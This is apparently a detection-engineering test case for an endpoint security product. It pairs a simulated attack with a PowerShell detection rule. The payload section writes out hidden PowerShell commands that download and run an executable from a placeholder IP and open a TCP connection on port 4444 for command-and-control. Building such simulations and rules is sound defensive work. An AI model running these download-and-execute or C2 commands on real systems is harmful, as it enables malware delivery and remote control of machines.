identity.summary: An attacker uses PowerShell to download and execute a payload from a rare external IP, then establishes C2 communication. Cortex should detect the unusual PowerShell process spawning and outbound netw
identity.description: An attacker uses PowerShell to download and execute a payload from a rare external IP, then establishes C2 communication. Cortex should detect the unusual PowerShell process spawning and outbound network connection to a rare host.

payload.code:
powershell -w hidden -c "Invoke-WebRequest -Uri 'http://192.0.2.100/malware.exe' -OutFile 'C:\\temp\\malware.exe'"
 powershell -w hidden -c "Start-Process 'C:\\temp\\malware.exe'"
 cmd /c "netstat -an | findstr 192.0.2.101"
 powershell -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('192.0.2.101', 4444)"

expected_artifacts.description: Outbound connection to rare external IP

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon PowerShell Process Communication
biocs.description: PowerShell process spawning child processes and connecting to rare external IP
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_remote_ip in ('192.0.2.101')
| filter action_process_image_name = 'powershell.exe'
